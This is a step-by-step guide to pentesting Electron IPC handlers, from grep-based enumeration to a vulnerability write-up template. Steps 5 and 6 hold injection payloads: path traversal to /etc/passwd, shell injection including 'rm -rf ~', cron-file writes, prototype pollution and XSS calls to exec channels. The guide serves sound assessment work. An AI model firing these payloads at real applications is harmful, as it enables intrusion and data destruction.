---
title: IPC Security Testing
description: Step-by-step guide to testing Electron IPC security — finding handlers, testing validation, exploiting weaknesses
---

# IPC Security Testing

IPC testing is where most Electron assessments pay off. The pattern is almost always the same: the renderer has some way to call privileged operations, and the main process handlers either don't validate input, don't check who's asking, or both. Finding it is a matter of systematic enumeration — catalog what handlers exist, read what they do, identify the ones that do something dangerous.

This guide walks through that process from a cold start on an extracted Electron app.

---

## Step 1: Enumerate Every Handler

Before reading any code in depth, get the full list:

```bash
# All ipcMain handlers — this is the complete attack surface:
grep -rn "ipcMain\.\(on\|handle\|once\)(" --include="*.js" . | \
  grep -v node_modules | sort > /tmp/ipc_handlers.txt

cat /tmp/ipc_handlers.txt

# How many handlers are we dealing with?
wc -l /tmp/ipc_handlers.txt
```

A small app might have 10-15 handlers. A large app might have 100+. The number tells you how much time this is going to take and whether you should prioritize by looking at dangerous operations first.

---

## Step 2: Map the Bridge

The preload script determines what's reachable from the renderer. A handler that exists but isn't exposed through the bridge is harder to reach (though not unreachable — XSS with `nodeIntegration: true` or a relay bridge removes that constraint):

```bash
# All contextBridge exposures:
grep -rn "exposeInMainWorld" --include="*.js" . -A 30 | grep -v node_modules

# Which preloads are loaded for which windows:
grep -r "preload:" --include="*.js" . | grep -v node_modules
```

For each exposure, note:
- Does it expose raw `ipcRenderer.invoke`? (Wide-open relay — every handler is reachable)
- Does it expose named functions that call specific channels? (Narrower, but still check what those channels do)
- Does it validate arguments before invoking IPC? (Even if it does, the ipcMain handler still needs its own validation)

---

## Step 3: Rank Handlers by Risk

Don't read 100 handlers in depth. Grep for the dangerous operations and start there:

```bash
# High-yield: handlers that do dangerous things with arguments:
grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 15 | \
  grep -E "exec\b|spawn\b|eval\b|require\s*\(|openExternal|writeFile|readFile" | \
  grep -v node_modules
```

Then classify manually:

| Risk | Pattern | Example |
|------|---------|---------|
| Critical | Executes OS commands | `exec(data)`, `spawn(data)` |
| Critical | Dynamic module loading | `require(data)`, `loadPlugin(data)` |
| High | Unvalidated file write | `fs.writeFile(data.path, data.content)` |
| High | Unvalidated file read | `fs.readFile(data.path)` |
| High | openExternal with renderer data | `shell.openExternal(data)` |
| Medium | External process communication | `process.send(data)` |
| Low | Read-only app data | `return { version: app.getVersion() }` |

Focus your deep reading on Critical and High handlers. Low-risk handlers are fine to skim.

---

## Step 4: Check Sender Validation

For every Critical and High handler, does it check who's asking?

```bash
# Handlers that DO validate sender (shows what's protected):
grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 10 | \
  grep -E "senderFrame\.url|getURL\(\)|sender\.url" | grep -v node_modules

# Handlers that DON'T — no senderFrame check before dangerous op:
grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 5 | \
  grep -v "senderFrame\|getURL\|node_modules" | \
  grep -E "exec\b|spawn\b|writeFile|openExternal"
```

A handler without sender validation accepts messages from any renderer — including one loaded with attacker content. After XSS, the attacker calls `ipcRenderer.invoke` directly. Preload validation is irrelevant. The main process handler is the only thing standing between the attacker and the dangerous operation.

---

## Step 5: Test Input Validation

For handlers that don't reject based on sender, try these from DevTools or via XSS:

```javascript
// Test: path traversal
ipcRenderer.invoke('read-config', '../../../etc/passwd');
ipcRenderer.invoke('read-config', '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts');

// Test: shell injection (if the handler builds command strings)
ipcRenderer.invoke('run-converter', '"; calc.exe; echo "', 'mp3');
ipcRenderer.invoke('run-converter', 'valid.mp4', 'mp3; rm -rf ~');

// Test: unexpected types
ipcRenderer.invoke('save-file', null, null);
ipcRenderer.invoke('save-file', { path: '../etc/cron.d/evil' }, '* * * * * id > /tmp/pwn');

// Test: prototype pollution
ipcRenderer.invoke('update-settings', { "__proto__": { "isAdmin": true } });
ipcRenderer.invoke('update-settings', { "constructor": { "prototype": { "isAdmin": true } } });

// Test: oversized input (DoS)
ipcRenderer.invoke('store-data', 'A'.repeat(10 * 1024 * 1024));
```

---

## Step 6: Reach Handlers from the Renderer

Depending on what security controls are in place, you have several options:

### Via DevTools (if unlocked)

```javascript
// DevTools console — gives you direct ipcRenderer access
const { ipcRenderer } = require('electron');  // only if nodeIntegration:true
await ipcRenderer.invoke('target-channel', 'payload').then(console.log);
```

Or via the contextBridge API (always accessible from DevTools):
```javascript
await window.electronAPI.someFunction('payload');
```

### Via XSS in the Renderer

Find any XSS, then use whatever the preload exposes. If the bridge is a relay:
```javascript
// Payload inside XSS:
window.api.invoke('exec-command', 'calc.exe');
```

If the bridge has named functions:
```javascript
window.api.saveFile('../../etc/cron.d/evil', '* * * * * /tmp/shell.sh');
```

If the bridge is narrow but you have a direct `ipcRenderer` reference somewhere in the bundled JS:
```javascript
// grep the bundled JS for ipcRenderer references
// sometimes it's passed as a module export rather than through contextBridge
```

### Via nodeIntegration (if enabled)

```javascript
// Any JS executing in renderer with nodeIntegration:true:
const { ipcRenderer } = require('electron');
await ipcRenderer.invoke('exec-cmd', 'calc.exe');
```

---

## Step 7: Chain It and Write It Up

Once you've confirmed a handler calls a dangerous operation with renderer-controlled input and lacks sender or argument validation, document the complete chain:

```markdown
## IPC Injection: '[channel-name]'

### Affected File
- `src/main/handlers.js:142` — ipcMain.handle('exec-command', ...)

### Dangerous Operation
- `child_process.exec(event.args.cmd)` at line 145
- `cmd` is the raw string from renderer, no validation

### Missing Controls
- No `event.senderFrame.url` check
- No type validation on `cmd`
- No allowlist or denylist

### Attack Chain
1. Attacker finds XSS in message rendering (src/renderer/chat.js:88)
2. XSS payload calls `window.api.runCommand(payload)`
3. Preload relays to `ipcRenderer.invoke('exec-command', { cmd: payload })`
4. Main process handler calls `exec(payload)` without validation
5. Arbitrary command runs as app user

### PoC
```javascript
// Via XSS in chat renderer:
window.api.runCommand('calc.exe');
// calc.exe opens as victim user
```

### Impact
Remote Code Execution. Any user who can send a message to the affected
channel can execute arbitrary commands on all connected clients.
```

---

## Quick Reference: High-Signal Grep Patterns

```bash
# Full IPC audit in one pipeline:
echo "=== ALL HANDLERS ===" && \
  grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . | grep -v node_modules | wc -l

echo "=== DANGEROUS HANDLERS ===" && \
  grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 15 | \
  grep -E "exec\b|spawn\b|openExternal|writeFile|readFile|require\s*\(" | \
  grep -v node_modules

echo "=== NO SENDER VALIDATION ===" && \
  grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 5 | \
  grep -v "senderFrame\|getURL\|node_modules" | \
  grep -E "exec\b|spawn\b|writeFile|openExternal"

echo "=== BRIDGE SURFACE ===" && \
  grep -rn "exposeInMainWorld" --include="*.js" . -A 20 | \
  grep -E "ipcRenderer\.|invoke\|send\b" | grep -v node_modules
```

Run this on a cold extracted ASAR and you'll have a prioritized list of what to read in depth within a few minutes.
